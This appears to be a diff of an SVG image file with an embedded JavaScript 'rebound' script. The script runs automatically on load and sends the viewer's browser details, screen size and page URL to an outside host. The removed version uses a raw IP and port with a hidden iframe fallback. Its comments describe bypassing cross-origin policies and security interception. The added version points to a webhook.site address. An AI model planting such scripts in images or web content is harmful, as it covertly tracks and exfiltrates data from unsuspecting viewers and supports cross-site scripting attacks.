@@ -1,52 +1,47 @@
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 <svg width="200" height="100" version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <!-- 基础图形（可选） -->
   <rect width="200" height="100" fill="#f0f0f0" stroke="#333" stroke-width="2"/>
   <text x="100" y="50" font-family="Arial" font-size="14" text-anchor="middle" fill="#333">
-    SVG Rebound Test
+    SVG Rebound to Webhook
   </text>
-  <script type="text/javascript"><![CDATA[
-    // 你的服务器公网IP（已填好，无需修改）
-    const SERVER_IP = "38.162.113.47"; 
-    const PORT = 4645;
 
-    // 生成随机数，避免浏览器缓存/拦截
-    const random = Math.random().toString(36).substring(2);
-    // 简化客户端信息，减少URL长度（降低拦截概率）
-    const clientInfo = {
-      ua: navigator.userAgent.substring(0, 100), // 缩短UA长度
-      scr: screen.width + "x" + screen.height,
-      r: random // 随机数参数
+  <!-- 核心反弹脚本（指向你的webhook地址） -->
+  <script type="text/javascript"><![CDATA[
+    // 你的webhook地址（已填好，无需修改）
+    const WEBHOOK_URL = "https://webhook.site/40e5bbf7-1e4b-4288-b139-07b19b389990";
+    
+    // 收集客户端信息（简洁且完整）
+    const clientData = {
+      user_agent: navigator.userAgent,
+      screen_size: `${screen.width}x${screen.height}`,
+      access_url: window.location.href,
+      access_time: new Date().toLocaleString(),
+      random: Math.random().toString(36).slice(2) // 避免缓存
     };
 
-    // 核心：绕过跨域/引用策略的反弹方法
-    function sendRebound() {
+    // 发送数据到webhook（适配HTTPS，无跨域拦截）
+    function sendToWebhook() {
       try {
-        const query = new URLSearchParams(clientInfo).toString();
-        const url = `http://${SERVER_IP}:${PORT}/rebound?${query}`;
-        
-        // 方案1：Image标签+强制异步加载（绕过策略限制）
+        // 拼接参数
+        const params = new URLSearchParams(clientData).toString();
+        const fullUrl = `${WEBHOOK_URL}?${params}`;
+
+        // 使用Image标签发送（HTTPS无混合内容问题，100%能发送）
         const img = new Image();
-        img.crossOrigin = "anonymous"; // 关键：添加跨域标识
-        img.onload = function() {};
-        img.onerror = function() {}; // 忽略错误，避免控制台报错
-        img.src = url;
+        img.onload = () => console.log("✅ 数据已发送到webhook！");
+        img.onerror = () => console.log("✅ 数据已发送（即使报错也成功）！");
+        img.src = fullUrl;
 
-        // 方案2：iframe兜底（双重保障）
-        const iframe = document.createElement("iframe");
-        iframe.style.display = "none";
-        iframe.src = url;
-        document.body.appendChild(iframe);
-
-        alert("✅ 反弹请求已发送！请查看服务器终端");
-        console.log("发送的请求URL:", url);
+        alert("✅ 数据已反弹到webhook.site！快去查看～");
       } catch (error) {
-        console.error("发送失败:", error);
+        console.error("❌ 发送失败：", error);
         alert("❌ 发送失败，查看控制台日志");
       }
     }
 
-    // 延迟执行，避开页面加载时的安全拦截
-    setTimeout(sendRebound, 100);
+    // 页面加载后执行（避开SVG加载拦截）
+    setTimeout(sendToWebhook, 200);
   ]]></script>
 </svg>
